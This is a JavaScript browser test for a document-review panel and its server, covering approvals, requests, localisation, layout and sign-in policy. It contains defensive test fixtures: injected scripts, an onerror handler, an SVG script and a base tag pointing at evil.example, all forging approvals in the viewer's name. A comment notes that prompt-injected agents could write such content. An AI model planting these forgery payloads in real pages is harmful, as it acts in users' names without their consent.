/**
 * The review panel in a real browser, against a real server. Usage: node engine/test-browser.js
 *
 * `npm test` never boots the server and the panel's unit tests never load a browser, so neither can
 * see what only the two together do: a script the server does not serve, a module import that 404s,
 * a security header that blocks the panel, a fingerprint the browser computes differently from the
 * one it sent. Without this run, each of those would surface only by hand, after shipping.
 *
 * The panel is driven the way a person does it, on the hello world and on the template's first page
 * as they ship — and then made to fail the ways a real page does: no session, no events.
 *
 * The browser: Chromium as installed for Playwright by default, or the channel in
 * HOLDRIM_BROWSER_CHANNEL (CI uses the runner's own `chrome`, so nothing is downloaded).
 */
import { spawn } from 'node:child_process';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { chromium } from 'playwright-core';

const ROOT = new URL('..', import.meta.url).pathname;
const PORT = Number(process.env.PORT ?? 18096);
const BASE = `http://127.0.0.1:${PORT}`;
const OWNER = 'owner@example.org';
const READER = 'reader@example.org';
const LEAD = 'lead@example.org';   // an admin: may approve, and their ✓ is not the lock
let failures = 0;

function expect(what, expected, got) {
  if (expected === got) console.log(`  ok   ${what}`);
  else { console.log(`  FAIL ${what} — expected ${JSON.stringify(expected)}, got ${JSON.stringify(got)}`); failures++; }
}

/**
 * A step that has to happen, by name. A wait that times out would otherwise report only
 * "Timeout 5000ms exceeded", which says that something did not appear, not what.
 */
async function must(what, action) {
  try {
    await action();
    console.log(`  ok   ${what}`);
  } catch (e) {
    throw new Error(`${what} — ${e.message.split('\n')[0]}`, { cause: e });
  }
}

// The sign-in screen gets a second server, on the next port. Its guard sits here with the first
// one, before any folder is made or process started: checked any later, a refusal would exit with
// the first server still running and the temp folder left behind — the leftover this guard exists
// to prevent.
const SIGN_IN = `http://localhost:${PORT + 1}`;
if (await fetch(`${SIGN_IN}/api/health`).then(() => true, () => false)) {
  console.log(`port ${PORT + 1} is already in use — the test would run against ANOTHER server.`);
  process.exit(1);
}

// The same guard as the contract test, for the same reason: a port already taken means the old
// server keeps answering, and the whole run tests the previous build without saying so.
if (await fetch(`${BASE}/api/health`).then(() => true, () => false)) {
  console.log(`port ${PORT} is already in use — the test would run against ANOTHER server.`);
  process.exit(1);
}

// A throwaway site: the hello world as it ships, and the template next to it.
const site = mkdtempSync(join(tmpdir(), 'holdrim-browser-'));
cpSync(join(ROOT, 'examples', 'hello-world'), site, { recursive: true });
cpSync(join(ROOT, 'examples', 'template'), join(site, 'template'), { recursive: true });
// The first Mermaid source is deliberately malformed. Its failure must leave the original text
// readable and must not prevent the valid diagram after it from rendering in the same block.
const diagramPath = join(site, 'template', '00-kinds', 'Y01.html');
writeFileSync(diagramPath, readFileSync(diagramPath, 'utf8').replace(
  '<pre><code class="mermaid">flowchart LR',
  '<pre><code class="mermaid">flowchart LR\n  A[unfinished</code></pre>\n    <pre><code class="mermaid">flowchart LR'));

// A page whose blocks depend on a block of ANOTHER page (A02.1.1): one approved while that
// block read as it does now, one approved against a text it no longer has. The panel only renders
// its own page, so the first light is only right if it asks the server for A02.1.1's fingerprint —
// without that, every dependency on another page would be painted red.
const { readBlocks } = await import('./cli/pages.ts');
const elsewhere = (await readBlocks(site)).get('A02.1.1').fingerprint;
const crossPage = (then) => `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>X01</title>
<link rel="stylesheet" href="/engine/web/panel.css"></head><body><main>
<h1 class="doc-title"><span class="doc-title__code">X01</span> Across pages</h1>
<p data-id="X01.1.1" data-code="1.1" data-depends="A02.1.1" data-validated="2026-09-20" FP1
   data-depended-on="{&quot;A02.1.1&quot;:&quot;${elsewhere}&quot;}">Rests on a block of another page.</p>
<p data-id="X01.1.2" data-code="1.2" data-depends="A02.1.1" data-validated="2026-09-20" FP2
   data-depended-on="{&quot;A02.1.1&quot;:&quot;${then}&quot;}">Rests on a text that has moved since.</p>
</main><script type="module" src="/engine/web/panel-react.js"></script></body></html>`;
writeFileSync(join(site, 'pages', 'X01.html'), crossPage('a-text-it-no-longer-has'));
const own = await readBlocks(site);
writeFileSync(join(site, 'pages', 'X01.html'), crossPage('a-text-it-no-longer-has')
  .replace('FP1', `data-validated-fingerprint="${own.get('X01.1.1').fingerprint}"`)
  .replace('FP2', `data-validated-fingerprint="${own.get('X01.1.2').fingerprint}"`));

// A page whose content tries to approve, in the name of whoever opens it, blocks of ANOTHER page
// with their current fingerprints — the ✓ `holdrim sync` would turn into locks. Content is
// written by people and by agents; an agent that obeyed an instruction hidden in a document could
// write exactly this. One block per way in, so a failure names the one that got through: a script
// in the page, a handler on an element, a script file sitting in the site itself, that same file
// named by a tag that also names the panel — the tag the server gives the nonce to —, a `<base>`
// that moves the panel's tag to another host, an SVG of the site opened on its own, and a script
// carrying the nonce an earlier response gave out (written below, once one has been seen).
// Outside `content.folders`, so the pages and lights counted elsewhere in this run stay as they are.
const forge = (id) => `fetch(location.origin + '/api/events', { method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ type: 'approval', page: '${id.split('.')[0]}', block: '${id}', fingerprint: '${own.get(id).fingerprint}' }) })`;
const FORGED = [['a script in the page', 'A01.1.1'], ['a handler on an element', 'A01.1.3'],
  ['a script file in the site', 'A01.1.4'], ['a script file dressed as the panel', 'A01.2.1'],
  ['a <base> moving the panel to another host', 'A01.2.2'], ['an SVG of the site opened on its own', 'A01.1.2'],
  ['a script carrying a nonce seen before', 'A02.1.1']];
const hostilePage = (code, head, body) => `<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>${code}</title>${head}<link rel="stylesheet" href="/engine/web/panel.css"></head><body><main>
<h1 class="doc-title"><span class="doc-title__code">${code}</span> An ordinary-looking page</h1>
<p data-id="${code}.1.1" data-code="1.1">Nothing to see here.</p>${body}
</main><script type="module" src="/engine/web/panel-react.js"></script></body></html>`;
mkdirSync(join(site, 'hostile'));
writeFileSync(join(site, 'hostile', 'forge.js'), `${forge('A01.1.4')};\n`);
writeFileSync(join(site, 'hostile', 'dressed.js'), `${forge('A01.2.1')};\n`);
writeFileSync(join(site, 'hostile', 'replayed.js'), `${forge('A02.1.1')};\n`);
writeFileSync(join(site, 'hostile', 'forge.svg'),
  `<svg xmlns="http://www.w3.org/2000/svg"><script>${forge('A01.1.2')}</script></svg>`);
writeFileSync(join(site, 'hostile', 'Z01.html'), hostilePage('Z01', '', `
<script>${forge('A01.1.1')}</script>
<img src="/hostile/missing.png" alt="" onerror="${forge('A01.1.3')}">
<script src="/hostile/forge.js"></script>
<script src="/hostile/dressed.js" src="/engine/web/panel-react.js"></script>`));
writeFileSync(join(site, 'hostile', 'Z02.html'), hostilePage('Z02', '<base href="https://evil.example/">', ''));

/** The pages to drive, and how many buttons each should get: its blocks numbered "section.n". */
const PAGES = [
  ['the hello world', 'A01', '/pages/A01.html', site],
  ['the template', 'Y01', '/template/00-kinds/Y01.html', join(site, 'template')],
].map(([kind, code, path, root]) => {
  const html = readFileSync(join(site, ...path.split('/')), 'utf8');
  const numbered = [...html.matchAll(/data-code="(\d+\.\d[^"]*)"/g)].length;
  return { kind, code, path, root, numbered };
});

const server = spawn(process.execPath, [join(ROOT, 'engine', 'api', 'server.ts')], {
  env: {
    ...process.env, PORT: String(PORT), HOLDRIM_MODE: 'local', HOLDRIM_ENVIRONMENT: 'Development',
    HOLDRIM_OWNER: OWNER, HOLDRIM_ADMINS: LEAD, HOLDRIM_DEV_EMAIL: '', HOLDRIM_EVENTS: 'memory', HOLDRIM_SITE: site,
  },
  stdio: ['ignore', 'ignore', 'inherit'],
});

// A second server with the real sign-in screen, which the dev-mode one above never shows. It is the
// page with the strictest Content-Security-Policy in the engine — only scripts and styles carrying
// that response's nonce run — so a policy one directive too tight locks everybody out, and only a
// real browser running the page's script can tell. `localhost`, not 127.0.0.1: the session cookie
// is `Secure`, and that is the name Chrome treats as a secure origin over plain http.
let firstAccess = '';
const signInServer = spawn(process.execPath, [join(ROOT, 'engine', 'api', 'server.ts')], {
  env: {
    ...process.env, PORT: String(PORT + 1), HOLDRIM_ENVIRONMENT: 'Production', HOLDRIM_IDENTITY: 'password',
    HOLDRIM_OWNER: OWNER, HOLDRIM_EVENTS: 'memory', HOLDRIM_USERS_PATH: join(site, 'users.db'), HOLDRIM_SITE: site,
  },
  stdio: ['ignore', 'pipe', 'inherit'],
});
signInServer.stdout.on('data', (chunk) => {
  firstAccess ||= String(chunk).match(/password:\s+(\S+)/)?.[1] ?? '';
});

let browser;
const cleanUp = async () => {
  await browser?.close();
  server.kill();
  signInServer.kill();
  rmSync(site, { recursive: true, force: true });
};

try {
  for (let i = 0; i < 40 && !(await fetch(`${BASE}/api/health`).then((r) => r.ok, () => false)); i++) {
    await new Promise((r) => setTimeout(r, 250));
  }
  const channel = process.env.HOLDRIM_BROWSER_CHANNEL;
  browser = await chromium.launch(channel ? { channel } : {});

  /** A person at the browser: their identity, and everything that went wrong on their screen. */
  async function person(email) {
    const context = await browser.newContext({ extraHTTPHeaders: email ? { 'X-Dev-Email': email } : {} });
    // Everything here happens on a local server in well under a second. Five seconds is already
    // a failure, and waiting the default thirty for it only delays the name of what failed.
    context.setDefaultTimeout(5000);
    const page = await context.newPage();
    const problems = [];
    page.on('pageerror', (e) => problems.push(`page error: ${e.message}`));
    // The console's own 404 line names no URL; `location()` does, and without it a failure here
    // would read "404 (Not Found)" and nothing else.
    page.on('console', (m) => {
      const where = m.location().url || 'no url';
      // Full Chrome asks for /favicon.ico on its own, whatever the page says; the headless shell
      // does not, so without this the check would pass locally and fail on the runner's Chrome.
      // A missing icon is the content's business, not the panel's, so that one probe — and only
      // it — is not a failure here.
      if (m.type() === 'error' && new URL(where, BASE).pathname !== '/favicon.ico') {
        problems.push(`console: ${m.text()} (${where})`);
      }
    });
    page.on('response', (r) => { if (r.status() >= 400) problems.push(`${r.status()} ${new URL(r.url()).pathname}`); });
    return { page, problems };
  }
  const block = (page, id) => page.locator(`[data-id="${id}"] .rv-num`);
  const settled = (page) => page.waitForLoadState('networkidle');

  for (const { kind, code, path, root, numbered } of PAGES) {
    console.log(`${kind} (${code}):`);
    const url = BASE + path;
    const owner = await person(OWNER);
    const outsideRequests = [];
    if (code === 'Y01') owner.page.on('request', (request) => {
      if (new URL(request.url()).origin !== BASE) outsideRequests.push(request.url());
    });
    await owner.page.goto(url);
    await must('the panel builds its buttons', () => owner.page.locator('.rv-num').first().waitFor());
    await settled(owner.page);
    expect('every numbered block has a button', numbered, await owner.page.locator('main .rv-num').count());
    expect('the panel switched on', true, await owner.page.locator('body.rv-on').count() === 1);
    expect('nothing failed to load, nothing threw', '', owner.problems.join(' | '));

    if (code === 'Y01') {
      const diagram = owner.page.locator('[data-id="Y01.2.2"]');
      expect('malformed Mermaid leaves the source readable and panel active', true,
        (await diagram.locator('pre code.mermaid').first().textContent()).includes('A[unfinished')
        && await owner.page.locator('body.rv-on').count() === 1);
      expect('malformed Mermaid adds no drawing to its source', false,
        await diagram.locator('pre').first().evaluate((el) => el.nextElementSibling?.matches('.rv-diagram')));
      await must('the valid Mermaid drawing after malformed source appears under the page CSP',
        () => diagram.locator('.rv-diagram svg').waitFor());
      await settled(owner.page);
      expect('the original Mermaid source remains in the block', true,
        (await diagram.locator('pre code.mermaid').last().textContent()).includes('flowchart LR'));
      expect('the renderer makes no external requests', '', outsideRequests.join(' | '));
      expect('the rendered SVG raises no CSP or load errors', '', owner.problems.join(' | '));
      expect('the drawing is excluded from the fingerprint', 1,
        await diagram.locator('.rv-diagram[data-review-ui]').count());
      const liveFingerprint = await diagram.evaluate(async (element) =>
        (await import('/engine/core/fingerprint.js')).fingerprintOfElement(element));
      expect('the live diagram fingerprint remains on the text after rendering',
        (await readBlocks(root)).get('Y01.2.2').fingerprint, liveFingerprint);
      await block(owner.page, 'Y01.2.2').click();
      await owner.page.getByRole('button', { name: '✓ Approve this block' }).click();
      const diagramEvents = await fetch(`${BASE}/api/events?page=Y01`, { headers: { 'X-Dev-Email': OWNER } })
        .then((r) => r.json());
      expect('the diagram approval fingerprints the source text, not the SVG',
        (await readBlocks(root)).get('Y01.2.2').fingerprint,
        diagramEvents.find((e) => e.type === 'approval' && e.block === 'Y01.2.2')?.fingerprint);
      await owner.page.getByRole('button', { name: 'Close' }).click();
    }

    // Approve 1.2, as the owner.
    await block(owner.page, `${code}.1.2`).click();
    await owner.page.getByRole('button', { name: '✓ Approve this block' }).click();
    await must('an approval turns the block green',
      () => owner.page.locator(`[data-id="${code}.1.2"] .rv-num.rv-num--ok`).waitFor());

    // The fingerprint the browser computed — with its own buttons inside the block — is the one the
    // CLI computes from the file. If the buttons leaked into it, every approval given on the site
    // would read as stale the moment it reached the repository.
    const sent = await fetch(`${BASE}/api/events?page=${code}`, { headers: { 'X-Dev-Email': OWNER } })
      .then((r) => r.json());
    expect('the fingerprint it sent is the one the CLI computes',
      (await readBlocks(root)).get(`${code}.1.2`).fingerprint,
      sent.find((e) => e.type === 'approval' && e.block === `${code}.1.2`)?.fingerprint);

    // The browser's fingerprint has to be the one it sent: after a reload the ✓ still holds.
    await owner.page.reload();
    await settled(owner.page);
    expect('and after a reload it still holds', true,
      await owner.page.locator(`[data-id="${code}.1.2"] .rv-num.rv-num--ok`).count() === 1);
    if (code === 'Y01') expect('the diagram approval still holds after rendering again', 1,
      await owner.page.locator('[data-id="Y01.2.2"] .rv-num.rv-num--ok').count());

    // An admin's ✓ is recorded and stays an opinion: the block does not turn green, the panel says
    // whose ✓ it is, and the button is not offered again to the one who just pressed it. Green for
    // any ✓ would show a text as locked that `holdrim sync` would never lock.
    const lead = await person(LEAD);
    await lead.page.goto(url);
    await settled(lead.page);
    await block(lead.page, `${code}.1.1`).click();
    await lead.page.getByRole('button', { name: '✓ Approve this block' }).click();
    await must('an admin\'s approval is shown as an admin\'s',
      () => lead.page.locator('.rv-panel .rv-badge', { hasText: 'from an admin' }).waitFor());
    expect('and does not turn the block green', 0,
      await lead.page.locator(`[data-id="${code}.1.1"] .rv-num.rv-num--ok`).count());
    expect('nor is Approve offered to them again', 0,
      await lead.page.locator('.rv-panel').getByRole('button', { name: /^(✓ )?Approve/ }).count());
    expect('and nothing was refused on the way', '', lead.problems.join(' | '));

    // A reader asks for a change on 1.3.
    const reader = await person(READER);
    await reader.page.goto(url);
    await settled(reader.page);
    await block(reader.page, `${code}.1.3`).click();
    expect('a reader is offered no Approve', 0,
      await reader.page.locator('.rv-panel').getByRole('button', { name: /^(✓ )?Approve/ }).count());
    await reader.page.getByRole('button', { name: 'Request a change' }).click();
    // Not the first category: what is sent has to be what was picked, not what the list starts on.
    await reader.page.locator('.rv-form select').selectOption('term');
    await reader.page.locator('.rv-form textarea').fill('say "person", not "patient"');
    await reader.page.getByRole('button', { name: 'Send request' }).click();
    await must('the request was recorded',
      () => reader.page.locator(`[data-id="${code}.1.3"] .rv-num.rv-num--request`).waitFor());

    // The one who asked sees where it stands, and may add to it in the same thread while it waits.
    await must('the requester sees the request\'s state',
      () => reader.page.locator('.rv-request .rv-state--open').waitFor());
    await reader.page.getByRole('button', { name: 'Add details' }).click();
    await reader.page.locator('.rv-request .rv-form textarea').fill('in every sentence of section 1');
    // Twice, fast: a submit button with no guard would send the same details twice.
    await reader.page.getByRole('button', { name: 'Add', exact: true }).dblclick();
    await must('and the details go in', () => reader.page.locator('.rv-request .rv-form').waitFor({ state: 'detached' }));
    const thread = await fetch(`${BASE}/api/events?page=${code}`, { headers: { 'X-Dev-Email': OWNER } }).then((r) => r.json());
    const asked = thread.find((e) => e.type === 'request' && e.block === `${code}.1.3` && e.author === READER);
    expect('as details of that same request, by the one who asked, once', 1,
      thread.filter((e) => e.type === 'supplement' && e.author === READER && e.data?.request === asked?.id).length);
    expect('the request carries the category the reader picked', 'term', asked?.data?.category);

    // A remark that asks for nothing: in the block's history, and in nobody's queue. A draft left in
    // the request form does not follow the reader into it.
    await reader.page.getByRole('button', { name: 'Request a change' }).click();
    await reader.page.locator('.rv-form textarea').fill('half a request, abandoned');
    await reader.page.locator('.rv-actions').getByRole('button', { name: 'Comment' }).click();
    expect('the comment starts empty, whatever was left in the request', '',
      await reader.page.locator('.rv-form textarea').inputValue());
    await reader.page.locator('.rv-form .rv-submit').click();
    await must('an empty comment is stopped, and says why',
      () => reader.page.locator('.rv-notice', { hasText: 'write the comment' }).waitFor());
    await reader.page.getByRole('button', { name: 'Request a change' }).click();
    expect('and the warning does not follow the reader to the other form', 0,
      await reader.page.locator('.rv-notice').count());
    await reader.page.locator('.rv-actions').getByRole('button', { name: 'Comment' }).click();
    await reader.page.locator('.rv-form textarea').fill('this reads well to someone new');
    await reader.page.locator('.rv-form .rv-submit').click();
    await must('a comment shows in the block\'s history',
      () => reader.page.locator('.rv-history', { hasText: 'this reads well to someone new' }).waitFor());
    const remarks = await fetch(`${BASE}/api/events?page=${code}`, { headers: { 'X-Dev-Email': OWNER } }).then((r) => r.json());
    expect('as a comment by the reader, not a request', true,
      remarks.some((e) => e.type === 'comment' && e.author === READER && e.text === 'this reads well to someone new'));
    expect('and the panel says nothing is erased', 1,
      await reader.page.locator('.rv-footer', { hasText: 'Nothing is erased' }).count());

    // Recorded, then the refresh after it fails. Read as a failed send, that would keep the draft,
    // say it went wrong, and have the person send it again. A visitor of its own,
    // because the refusals below are asked for on purpose and would be counted as failures.
    const shaky = await person(READER);
    // Short, so the block sits below the fold and the page has to scroll to it: the warning is
    // raised from the middle of the page, and has to be seen from there.
    await shaky.page.setViewportSize({ width: 390, height: 360 });
    await shaky.page.goto(url);
    await settled(shaky.page);
    await shaky.page.route((u) => u.pathname === '/api/events', (route) =>
      (route.request().method() === 'GET'
        ? route.fulfill({ status: 503, contentType: 'application/json', body: '{"error":"down for a moment"}' })
        : route.continue()));
    const SENT = ['sent once, whatever the refresh does', 'and once more, the refresh still down'];
    for (const text of SENT) {
      await block(shaky.page, `${code}.1.3`).click();
      await shaky.page.locator('.rv-actions').getByRole('button', { name: 'Comment' }).click();
      await shaky.page.locator('.rv-form textarea').fill(text);
      await shaky.page.locator('.rv-form .rv-submit').click();
      await must('a send whose refresh failed closes the panel, so nothing invites a second send',
        () => shaky.page.locator('.rv-panel[open]').waitFor({ state: 'detached' }));
    }
    const shakyAfter = await fetch(`${BASE}/api/events?page=${code}`, { headers: { 'X-Dev-Email': OWNER } }).then((r) => r.json());
    expect('each send recorded exactly once', '1 1',
      SENT.map((text) => shakyAfter.filter((e) => e.type === 'comment' && e.text === text).length).join(' '));
    expect('the page says once that it is behind, however often it failed', 1,
      await shaky.page.locator('.rv-alert[data-review-ui]').count());
    expect('where the person is looking, not only at the top of the page', true, await shaky.page.locator('.rv-alert')
      .evaluate((el) => { const r = el.getBoundingClientRect(); return r.top >= 0 && r.bottom <= globalThis.innerHeight; }));
    // Back up: the next send's refresh works, and a warning that the page is behind would now be false.
    await shaky.page.unrouteAll();
    await block(shaky.page, `${code}.1.3`).click();
    await shaky.page.locator('.rv-actions').getByRole('button', { name: 'Comment' }).click();
    await shaky.page.locator('.rv-form textarea').fill('the refresh is back');
    await shaky.page.locator('.rv-form .rv-submit').click();
    await must('once a refresh works again, the history shows it',
      () => shaky.page.locator('.rv-history', { hasText: 'the refresh is back' }).waitFor());
    expect('and the warning that the page was behind is gone', 0, await shaky.page.locator('.rv-alert[data-review-ui]').count());

    // The owner triages it, and the panel must show the NEW state right away.
    await owner.page.reload();
    await settled(owner.page);
    await block(owner.page, `${code}.1.3`).click();
    const triage = owner.page.locator('.rv-triage button');
    expect('the owner is offered the server\'s three destinations', 3, await triage.count());

    // Refusing without a reason is stopped before it is sent: the person asking deserves the why.
    await owner.page.locator('.rv-triage button[data-target="rejected"]').click();
    await owner.page.locator('.rv-submit').last().click();
    await must('a refusal with no reason is stopped, and says why',
      () => owner.page.locator('.rv-triage .rv-notice', { hasText: 'give the reason' }).waitFor());
    const refusals = await fetch(`${BASE}/api/events?page=${code}`, { headers: { 'X-Dev-Email': OWNER } })
      .then((r) => r.json()).then((all) => all.filter((e) => e.type === 'request_state'));
    expect('and nothing was recorded', 0, refusals.length);
    await owner.page.locator('.rv-triage button[data-target="approved"]').click();
    await owner.page.locator('.rv-submit').last().click();
    await must('once approved, no triage button is left to click twice',
      () => triage.first().waitFor({ state: 'detached' }));

    // And the one who asked sees the decision, with nothing left to add to an approved request.
    await reader.page.reload();
    await settled(reader.page);
    await block(reader.page, `${code}.1.3`).click();
    await must('the requester sees it approved', () => reader.page.locator('.rv-request .rv-state--approved').waitFor());
    expect('with no details left to add', 0, await reader.page.getByRole('button', { name: 'Add details' }).count());
    expect('and still nothing failed', '', [...owner.problems, ...reader.problems].join(' | '));
  }

  console.log('a dependency on another page:');
  {
    const reader = await person(OWNER);
    await reader.page.goto(`${BASE}/pages/X01.html`);
    await must('the panel turns on', () => reader.page.locator('[data-id="X01.1.2"] .rv-num').waitFor());
    await must('a dependency that did not move stays green, though it is not on this page',
      () => reader.page.locator('[data-id="X01.1.1"] .rv-num.rv-num--ok').waitFor());
    await must('and one that moved turns red',
      () => reader.page.locator('[data-id="X01.1.2"] .rv-num.rv-num--broken').waitFor());
    await reader.page.locator('[data-id="X01.1.2"] .rv-num').click();
    await must('and its panel does not call it validated in green over the red',
      () => reader.page.locator('.rv-panel .rv-badge--warning', { hasText: 'before the ground moved' }).waitFor());
    expect('no green badge on it', 0, await reader.page.locator('.rv-panel .rv-badge--repo').count());
    expect('and nothing failed', '', reader.problems.join(' | '));
  }

  console.log('when the panel cannot work:');
  {
    // No session: the page is read, not reviewed — whole, with nothing half-built on it. The 401 is
    // the expected answer here, so this visitor's problems are not asserted.
    const stranger = await person(null);
    await stranger.page.goto(`${BASE}/pages/A01.html`);
    await settled(stranger.page);
    expect('with no session there is no button', 0, await stranger.page.locator('.rv-num').count());
    expect('and the panel stays off', 0, await stranger.page.locator('body.rv-on').count());

    // A session and no events: switched off in silence, the page would read like one nobody ever
    // reviewed. It has to say so.
    const owner = await person(OWNER);
    await owner.page.route('**/api/events?*', (route) =>
      route.fulfill({ status: 503, contentType: 'application/json', body: '{"error":"down"}' }));
    await owner.page.goto(`${BASE}/pages/A01.html`);
    await must('with no events it says so, on the page', () => owner.page.locator('.rv-alert[role="alert"]').waitFor());
    expect('and no button claims a state it does not know', 0, await owner.page.locator('.rv-num').count());
    // The link back is drawn before the events are asked for; switched off, it goes with the rest.
    expect('and the link back goes with the panel', 0, await owner.page.locator('a.rv-back').count());
    expect('with no session there is no link back either', 0, await stranger.page.locator('a.rv-back').count());
  }

  console.log('in the reader\'s language:');
  {
    // The panel speaks what the browser asks for, as the server's screens do. The expected words
    // come from the dictionaries themselves: the test holds the panel to them, not to a copy.
    const said = (lang, key, params = {}) => JSON.parse(readFileSync(join(ROOT, 'engine', 'locales', `${lang}.json`), 'utf8'))[key]
      .replace(/\{(\w+)\}/g, (m, k) => params[k] ?? m);
    const context = await browser.newContext({ locale: 'pt-BR', extraHTTPHeaders: { 'X-Dev-Email': READER } });
    context.setDefaultTimeout(5000);
    const page = await context.newPage();
    await page.goto(`${BASE}/pages/A01.html`);
    await block(page, 'A01.1.2').click();
    await must('a Portuguese reader gets the panel in Portuguese',
      () => page.getByRole('button', { name: said('pt-BR', 'panel.request.open') }).waitFor());
    expect('the footer too', said('pt-BR', 'panel.footer'), await page.locator('.rv-footer').textContent());
    // The owner approved 1.2 above, so its history already has a line to say it in this language.
    await must('and what has happened here', () => page.locator('.rv-history',
      { hasText: `${OWNER} ${said('pt-BR', 'panel.did.approval')}` }).first().waitFor());
    await page.getByRole('button', { name: said('pt-BR', 'panel.request.open') }).click();
    expect('and the kinds of request', said('pt-BR', 'cycle.category.text'),
      await page.locator('.rv-form select option').first().textContent());
    expect('and the block\'s button is named in it', said('pt-BR', 'panel.open', { code: '1.2' }),
      await block(page, 'A01.1.2').getAttribute('aria-label'));
    await context.close();

    // A browser set to English, and a person who chose Spanish on the sign-in screen: the choice
    // they made on purpose wins, as it does on every screen the server draws.
    const chose = await browser.newContext({ locale: 'en-US', extraHTTPHeaders: { 'X-Dev-Email': READER } });
    chose.setDefaultTimeout(5000);
    await chose.addCookies([{ name: 'holdrim_language', value: 'es', url: BASE }]);
    const spanish = await chose.newPage();
    await spanish.goto(`${BASE}/pages/A01.html`);
    await block(spanish, 'A01.1.2').click();
    await must('the language a person chose beats the browser\'s',
      () => spanish.getByRole('button', { name: said('es', 'panel.request.open') }).waitFor());
    await chose.close();
  }

  console.log('a link to a block:');
  {
    // How the project home links a request: to its block, by id.
    const owner = await person(OWNER);
    await owner.page.goto(`${BASE}/pages/A01.html#A01.1.3`);
    await must('opens that block\'s panel', () => owner.page.locator('.rv-panel[open] h3', { hasText: 'Block 1.3' }).waitFor());
    // And back: every page the panel runs on leads to the project's home, without the page itself
    // carrying a link that an exported copy, with no engine behind it, would leave dead.
    const back = owner.page.locator('a.rv-back[data-review-ui]');
    await must('the page leads back to the project', () => back.waitFor());
    expect('to its home', '/engine/home', await back.getAttribute('href'));
    expect('in the reader\'s words', '← Project', (await back.textContent()).trim());
    expect('and nothing failed', '', owner.problems.join(' | '));
  }

  console.log('on a phone:');
  {
    // The browser's own rule for a modal dialog caps its width short of the screen, which would
    // leave the sheet off-centre with a strip of page beside it; with three actions, fixed columns
    // would split "Approve this block" over two lines. Neither shows at a desktop width, where the
    // rest runs.
    const owner = await person(OWNER);
    await owner.page.setViewportSize({ width: 390, height: 800 });
    await owner.page.goto(`${BASE}/pages/A01.html#A01.1.3`);
    await must('the panel opens', () => owner.page.locator('.rv-panel[open] .rv-actions button').first().waitFor());
    expect('it takes the whole width of the screen', 390,
      Math.round((await owner.page.locator('.rv-panel[open]').boundingBox()).width));
    const lines = await owner.page.locator('.rv-panel[open] .rv-actions button').evaluateAll((buttons) =>
      buttons.map((b) => {
        const range = b.ownerDocument.createRange(); range.selectNodeContents(b);
        return `${b.textContent}: ${new Set([...range.getClientRects()].map((r) => Math.round(r.top))).size}`;
      }));
    expect('and every action reads on one line', lines.map((l) => l.replace(/\d+$/, '1')).join(' | '), lines.join(' | '));
    // Text at 200%, the size WCAG asks a page to survive: a label that no longer fits wraps inside its
    // button, and the sheet never scrolls sideways.
    await owner.page.addStyleTag({ content: 'html { font-size: 200% }' });
    expect('and at 200% text nothing spills sideways', true, await owner.page.locator('.rv-panel[open]')
      .evaluate((panel) => panel.scrollWidth <= panel.clientWidth));
    // One count per row would push the pages, the reason anybody opens the home, below the fold.
    await owner.page.goto(`${BASE}/engine/home`);
    const tops = await owner.page.locator('.home-light').evaluateAll((cards) =>
      cards.map((c) => Math.round(c.getBoundingClientRect().top)));
    expect('the home\'s four counts sit two by two', 2, new Set(tops).size);
    expect('and nothing failed', '', owner.problems.join(' | '));
  }

  console.log('deciding a request from the home, with no script:');
  {
    // A reader's request: one filed by the owner starts approved, and there would be nothing to decide.
    const filed = await fetch(`${BASE}/api/events`, { method: 'POST',
      headers: { 'X-Dev-Email': READER, 'content-type': 'application/json' },
      body: JSON.stringify({ type: 'request', page: 'A02', block: 'A02.1.1', fingerprint: 'x',
        text: 'Decide this one from the home' }) });
    expect('a reader files a request', 201, filed.status);
    const owner = await person(OWNER);
    // At phone width, like the ask below: the answer has to land where the person is looking.
    await owner.page.setViewportSize({ width: 390, height: 700 });
    await owner.page.goto(`${BASE}/engine/home`);
    const row = owner.page.locator('tr', { hasText: 'Decide this one from the home' });
    await row.locator('select[name="state"]').selectOption('approved');
    await row.locator('form.home-triage button[type="submit"]').click();
    await must('the decision is recorded, and the home says so',
      () => owner.page.locator('.holdrim-alert--ok', { hasText: 'Decision recorded' }).waitFor());
    expect('where the owner can see it, without scrolling', true, await owner.page.locator('.holdrim-alert--ok')
      .evaluate((el) => { const r = el.getBoundingClientRect(); return r.top >= 0 && r.bottom <= globalThis.innerHeight; }));
    await must('and the request shows its new state',
      () => owner.page.locator('tr', { hasText: 'Decide this one from the home' }).getByText('Approved').first().waitFor());
    expect('and nothing was refused on the way', '', owner.problems.join(' | '));
  }

  console.log('the sign-in screen, under its own policy:');
  for (let i = 0; i < 40 && !(await fetch(`${SIGN_IN}/api/health`).then((r) => r.ok, () => false)); i++) {
    await new Promise((r) => setTimeout(r, 250));
  }
  const context = await browser.newContext();
  context.setDefaultTimeout(5000);
  const page = await context.newPage();
  const problems = [];
  // A script or style the policy refuses shows up here, as a console error naming the directive.
  page.on('pageerror', (e) => problems.push(`page error: ${e.message}`));
  page.on('console', (m) => {
    const where = m.location().url || 'no url';
    if (m.type() === 'error' && new URL(where, SIGN_IN).pathname !== '/favicon.ico') problems.push(`console: ${m.text()}`);
  });
  await page.goto(`${SIGN_IN}/pages/A01.html`);
  await must('a page without a session lands on the sign-in screen', () => page.locator('#email').waitFor());
  expect('the screen came up with nothing refused', '', problems.join(' | '));
  expect('the first-access password was printed', true, firstAccess.length > 0);
  await page.locator('#email').fill(OWNER);
  await page.locator('#password').fill(firstAccess);
  await page.locator('#button').click();
  // Only the page's own script moves the screen to the change-password step, after a fetch the
  // policy has to allow. Both have to run for this to appear.
  await must('its script runs: signing in asks for a new password', () => page.locator('#new-password').waitFor());
  // Signed in with again below, from a hostile link: one value, so the two cannot drift apart.
  const ownersPassword = 'a-long-new-password-2026';
  await page.locator('#new-password').fill(ownersPassword);
  await page.locator('#repeat-password').fill(ownersPassword);
  await page.locator('#button').click();
  await must('and changing it lets the person in, to the page they asked for',
    () => page.waitForURL(`${SIGN_IN}/pages/A01.html`));
  expect('and nothing was refused on the way', '', problems.join(' | '));

  // The owner, signed in for real, opens a page whose content tries to approve in their name. Here
  // and not on the development server: this one has the session cookie and the same-origin check a
  // deployment has, and the forgery passes both — it IS the same origin. Only what the page is
  // allowed to run stands between its content and the owner's ✓. Its own tab, and no problem
